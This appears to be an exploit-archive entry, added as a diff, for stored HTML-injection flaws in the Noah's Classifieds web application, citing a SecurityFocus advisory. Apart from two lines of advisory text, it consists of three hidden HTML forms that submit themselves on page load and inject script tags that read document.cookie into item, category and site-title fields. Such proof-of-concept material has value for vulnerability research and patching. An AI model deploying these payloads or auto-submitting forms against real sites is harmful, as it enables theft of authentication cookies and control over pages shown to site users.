@@ -1,0 +1,75 @@
+source: http://www.securityfocus.com/bid/47578/info
+
+Noah's Classifieds is prone to multiple HTML-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+Attacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials and to control how the site is rendered to the user; other attacks are also possible.
+
+<form action="http://host/index.php" method="post" name="main" enctype="multipart/form-data">
+<input type="hidden" name="list" value="item">
+<input type="hidden" name="method" value="create">
+<input type="hidden" name="rollid" value="2">
+<input type="hidden" name="id" value="0">
+<input type="hidden" name="cid" value="2">
+<input type="hidden" name="col_16"  value="">
+<input type="hidden" name="col_17" value=&#039;title"><script>alert(document.cookie)</script>&#039;>
+<input type="hidden" name="col_18" value=&#039;<p>description of my"&gt;</p>
+<script type="text/javascript">// <![CDATA[
+alert(document.cookie)
+// ]]></script>&#039;>
+<input type="hidden" name="col_19" value="Pc">
+<input type="hidden" name="col_20" value="">
+<input type="hidden" name="gsubmit" value="Ok">
+</form>
+<script>
+document.main.submit();
+</script>
+
+<form action="http://host/index.php" method="post" name="main" enctype="multipart/form-data">
+<input type="hidden" name="list" value="appcategory">
+<input type="hidden" name="method" value="modify">
+<input type="hidden" name="rollid" value="5">
+<input type="hidden" name="id" value="5">
+<input type="hidden" name="up" value="1">
+<input type="hidden" name="wholeName" value="catitem">
+<input type="hidden" name="name" value="catitem">
+<input type="hidden" name="description" value=&#039;cat2"><script>alert(document.cookie)</script>&#039;>
+<input type="hidden" name="picture" value="">
+<input type="hidden" name="descriptionMeta" value="">
+<input type="hidden" name="keywords" value="">
+<input type="hidden" name="customAdMeta" value="">
+<input type="hidden" name="allowAd" value="1">
+<input type="hidden" name="immediateAppear" value="1">
+<input type="hidden" name="inactivateOnModify" value="1">
+<input type="hidden" name="displayResponseLink" value="1">
+<input type="hidden" name="displayFriendmailLink" value="1">
+<input type="hidden" name="displayFlaggedLink" value="1">
+<input type="hidden" name="customAdListTitle" value="">
+<input type="hidden" name="customAdListTemplate" value="">
+<input type="hidden" name="customAdDetailsTemplate" value="">
+<input type="hidden" name="gsubmit" value="Ok">
+</form>
+<script>
+document.main.submit();
+</script>
+
+<form action="http://host/index.php" method="post" name="main" enctype="multipart/form-data">
+<input type="hidden" name="list" value="appsettings">
+<input type="hidden" name="method" value="modify">
+<input type="hidden" name="rollid" value="1">
+<input type="hidden" name="id" value="1">
+<input type="hidden" name="defaultTheme" value="modern">
+<input type="hidden" name="defaultLanguage" value="en">
+<input type="hidden" name="langDir" value="ltr">
+<input type="hidden" name="adminEmail" value="">
+<input type="hidden" name="titlePrefix" value=&#039;[Noahs Classifieds]</title><script>alert(document.cookie)</script>&#039;>
+<input type="hidden" name="mainTitle" value="">
+<input type="hidden" name="charLimit" value="0">
+<input type="hidden" name="blockSize" value="20">
+<input type="hidden" name="dateFormat" value="Y-m-d">
+<input type="hidden" name="timeFormat" value="Y-m-d H:i">
+<input type="hidden" name="gsubmit" value="Ok">
+
+</form>
+<script>
+document.main.submit();
+</script>
